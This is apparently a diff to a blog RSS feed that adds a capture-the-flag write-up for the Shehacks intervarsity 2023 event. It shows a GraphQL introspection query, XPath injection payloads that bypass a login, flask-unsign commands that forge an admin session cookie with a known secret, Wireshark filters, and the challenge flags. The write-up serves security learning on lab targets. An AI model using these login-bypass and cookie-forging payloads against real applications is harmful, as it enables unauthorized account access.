@@ -6,7 +6,208 @@
         <description>Recent content in Posts on f0rk3b0mb</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 31 Jul 2023 16:18:16 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 22 Sep 2023 14:29:32 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Shehacks_intrervasity_2023</title>
+        <link>https://f0rk3b0mb.github.io/p/shehacks_intrervasity_2023/</link>
+        <pubDate>Fri, 22 Sep 2023 14:29:32 +0300</pubDate>
+        
+        <guid>https://f0rk3b0mb.github.io/p/shehacks_intrervasity_2023/</guid>
+        <description>&lt;img src="https://f0rk3b0mb.github.io/cover/shctf.jpg" alt="Featured image of post Shehacks_intrervasity_2023" /&gt;&lt;h3 id=&#34;shehacks-intervasity-ctf-2023&#34;&gt;Shehacks intervasity ctf 2023&lt;/h3&gt;
+&lt;p&gt;This ctf onsite at usiu , nairobi . I particpated online.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;web category&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;graph1&#34;&gt;Graph1&lt;/h2&gt;
+&lt;p&gt;This was an easy chalenge that teated knowledge in graphql queries&lt;/p&gt;
+&lt;p&gt;the graphql endpoint was located at /graphql.&lt;/p&gt;
+&lt;p&gt;for more info on how to enumerate graphql &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;So basicaly if we send the query below we get introspection on the grapql endpoint&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;{__schema{types{name,fields{name}}}}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;remember to set the content-type to &amp;ldquo;appication/graphql&amp;rdquo; when sending the request&lt;/p&gt;
+&lt;p&gt;From this we find out that there is a field known as getFlag. We can then run the query below to get the flag . It was base64 encoded , so we decode it to get the flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/shctf/getflag.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;getflag&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/shctf/graphql_flag.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;grapql_flag&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;x-marks-the-spot&#34;&gt;X marks the spot&lt;/h2&gt;
+&lt;p&gt;In this challenge we are given a web application login field , i tried sql injection at first an an error was thrown&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;SimpleXMLElement::xpath(): Invalid predicate in &amp;lt;b&amp;gt;/var/www/html/backend.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This indicated that the appication is vulnerable to xpath injection&lt;/p&gt;
+&lt;p&gt;you can check the payloads &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/pentesting-web/xpath-injection&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;hacktricks xpath&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;i tried the payload&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&amp;#39;or 1=1 or&amp;#39;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;this is able to bypass login and i get the result&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;{&amp;#34;username&amp;#34;:&amp;#34;admin&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;supersecret&amp;#34;,&amp;#34;api-key&amp;#34;:&amp;#34;api-admin-key&amp;#34;}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;to move laterally through accounts i used the following payload , i achieved this after after trying lots of payloads&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&amp;#39;or position()=3 or&amp;#39;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;by changing the number above we can basically login as different users , in this case 3 gets us the flag.&lt;/p&gt;
+&lt;p&gt;PS i got first blood on this challenge :)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;{&amp;#34;username&amp;#34;:&amp;#34;ali&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;654321&amp;#34;,&amp;#34;api-key&amp;#34;:&amp;#34;flag{s0m30n3_n33ds_1npu7_v4l1d4t10n}&amp;#34;}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;secrets&#34;&gt;secrets&lt;/h2&gt;
+&lt;p&gt;For this challenge you are provided with a signin page and you can also register.&lt;/p&gt;
+&lt;p&gt;We have to manipulate the cookie to become the admin user. For this i used the tool flask-unsign , you can get it &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/Paradoxis/Flask-Unsign&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;flask-unsign --decode  --cookie &amp;#34;.eJwljkFOBDEMBP-SM4fYjuN4PzOKYxtWiAHN7J4Qf2cQx26pSvVdtjzifCu3x_GMl7LdvdwKyJKcbQnKyJARCmralZw6kPrsiDrYxnSBmQ0SclBMrk5cRyUF55qcuRb2RSbDZGkjTsLBfXpQY21iyd2hUiYahseQBp2tXCHPM47_GuJrr_PI7fH5Hvv1rOE4Wpi4IjjMqmJx1UX1XqtPNKsa2C7uT7PPj7ior_v-Wn5-AZmVRW0.ZQ5wGQ.2gLkeklbQ2OS2GBjMTAi2uiVKWI&amp;#34;
+
+{&amp;#39;_fresh&amp;#39;: True, &amp;#39;_id&amp;#39;: &amp;#39;17c7fa4c7278fe78e919b9693d36139da622985b8ad71af41f1f83ea50d35080391d50f5ffcc26c3b78b7c9435f32856ade345947bf56d103ff2b2ede874165b&amp;#39;, &amp;#39;_user_id&amp;#39;: &amp;#39;35&amp;#39;, &amp;#39;csrf_token&amp;#39;: &amp;#39;c8d284eb7d921d1a097be93de0d600da2bb09e24&amp;#39;, &amp;#39;username&amp;#39;: &amp;#39;ping&amp;#39;}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;We then have to change the uid to 1 and username to admin and then sign the cookie with secretkey &amp;lsquo;SheHacks&amp;rsquo;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;flask-unsign --sign --cookie  &amp;#34;{ &amp;#39;_user_id&amp;#39;: &amp;#39;1&amp;#39;, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;}&amp;#34; --secret &amp;#39;SheHacks&amp;#39;
+
+
+eyJfdXNlcl9pZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.ZQ59CA.CUKCpa3SPstLemcqmuEDrSqmpFI
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Using this cookie we can get the flag :  flag{s3c3ts_4re_n0_l0ng3r_s4f3}&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;forensics category&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;snifferdog1&#34;&gt;SnifferDog1&lt;/h2&gt;
+&lt;p&gt;How many packets in total passed through port 445 shctf{Ans}&lt;/p&gt;
+&lt;p&gt;For this we just use the filter &amp;ldquo;tcp.port == 445&amp;rdquo; then check the bottom right of wireshrk for number of packets   shctf{10223}&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;sniffer-dog2&#34;&gt;Sniffer Dog2&lt;/h2&gt;
+&lt;p&gt;What is the 6th disallowed item listed in http://192.168.56.103:8081/robots.txt?&lt;/p&gt;
+&lt;p&gt;For this we just use  the filter &amp;ldquo;ip.addr == 192.168.56.103 &amp;amp;&amp;amp; tcp.port == 8081 &amp;amp;&amp;amp; http&amp;rdquo; then find &amp;ldquo;robots.txt&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/shctf/robots.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;robots&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;shctf{instalation}&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;snifferdog3&#34;&gt;SnifferDog3&lt;/h2&gt;
+&lt;p&gt;What version of Jenkins is running on 192.168.56.103? shctf{VersionOnly}&lt;/p&gt;
+&lt;p&gt;For this we just use  the filter &amp;ldquo;ip.addr == 192.168.56.103&amp;rdquo; then find &amp;ldquo;jenkins&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/shctf/jenkins.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;jenkins&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;shctf{1.647}&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;snifferdog4&#34;&gt;SnifferDog4&lt;/h2&gt;
+&lt;p&gt;What is the domain SID for 192.168.56.103 shctf{S&amp;hellip;}&lt;/p&gt;
+&lt;p&gt;For this we just use  the filter &amp;ldquo;ip.addr == 192.168.56.103&amp;rdquo; then find &amp;ldquo;S-1-5&amp;rdquo;  this is the format for sid  you can learn more &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;&#34; &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/shctf/sid.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;sid&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;shctf{S-1-5-21-2950693484-2233299975-203034155}&lt;/p&gt;
+&lt;hr&gt;
+</description>
+        </item>
+        <item>
         <title>Windows events and log analysis</title>
         <link>https://f0rk3b0mb.github.io/p/windows-events-and-log-analysis/</link>
         <pubDate>Mon, 31 Jul 2023 16:18:16 +0300</pubDate>
